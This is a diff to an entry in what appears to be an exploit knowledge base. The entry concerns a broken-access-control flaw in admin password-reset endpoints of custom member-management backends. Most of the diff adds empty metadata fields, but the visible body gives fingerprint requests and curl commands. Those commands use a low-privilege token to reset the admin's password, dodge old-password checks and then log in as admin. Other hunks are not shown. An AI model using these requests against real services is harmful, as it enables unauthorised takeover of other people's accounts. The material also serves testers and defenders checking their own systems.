@@ -1,22 +1,42 @@
 ﻿---
-title: Broken access control in the admin "reset any user's password" endpoint (direct member/admin takeover)
-cve: None (business logic)
-severity: critical
+id: "admin-reset-any-user"
+title: "Broken access control in the admin \"reset any user's password\" endpoint (direct member/admin takeover)"
+kind: "business-logic"
+cve: null
+related-cves: null
+cve-note: "None (business logic)"
+severity: "critical"
 cvss: 9.2
-product: Custom backend (member management / agent management)
-versions: Any
-ports: 80, 443
-keywords: password reset, arbitrary user, broken access control, admin, takeover
-entry: /api/admin/user/resetPassword  /api/agent/resetPwd
+severity-basis: "cvss"
+severity-note: null
+product: "Custom backend (member management / agent management)"
+versions: "Any"
+ports: "80, 443"
+keywords: "password reset, arbitrary user, broken access control, admin, takeover"
+entry: "/api/admin/user/resetPassword /api/agent/resetPwd"
 verified: false
-sources: Compiled from public sources (business logic; no CVE)
+verified-on: null
+verification-evidence: null
+source-url: null
+vendor-advisory: null
+cwe: null
+patch-date: null
+sources: "Compiled from public sources (business logic; no CVE)"
+kev: null
+kev-date: null
+kev-source: null
+epss: null
+epss-percentile: null
+epss-date: null
+epss-source: null
+enrichment-updated: null
 ---
 
-## Fingerprints
+## Fingerprinting
 
 ```
 POST /api/admin/user/resetPassword {"uid":1001,"password":"..."}
-POST /api/user/updatePwd            {"uid":...,"oldPwd":"","newPwd":"..."}
+POST /api/user/updatePwd {"uid":...,"oldPwd":"","newPwd":"..."}
 ```
 
 ## Prerequisites
@@ -36,11 +56,11 @@ Authorization: Bearer <low-privilege-token>
 ```bash
 # 2) Confirm success: log in to the target account with the new password
 curl -s -X POST 'https://target/api/login' -H 'Content-Type: application/json' \
-  -d '{"username":"admin","password":"Passw0rd!2026"}' | head -c 200
+ -d '{"username":"admin","password":"Passw0rd!2026"}' | head -c 200
 
 # 3) If the endpoint checks oldPwd, pass an empty value or omit it
 curl -s -X POST 'https://target/api/user/updatePwd' -H "Authorization: Bearer <t>" \
-  -H 'Content-Type: application/json' -d '{"uid":1,"newPwd":"Passw0rd!2026"}'
+ -H 'Content-Type: application/json' -d '{"uid":1,"newPwd":"Passw0rd!2026"}'
 ```
 
 ## Exploitation Steps
@@ -56,4 +76,4 @@ curl -s -X POST 'https://target/api/user/updatePwd' -H "Authorization: Bearer <t
 
 ## References
 
-- OWASP API5 BFLA；CWE-639。
+- OWASP API5 BFLA; CWE-639.
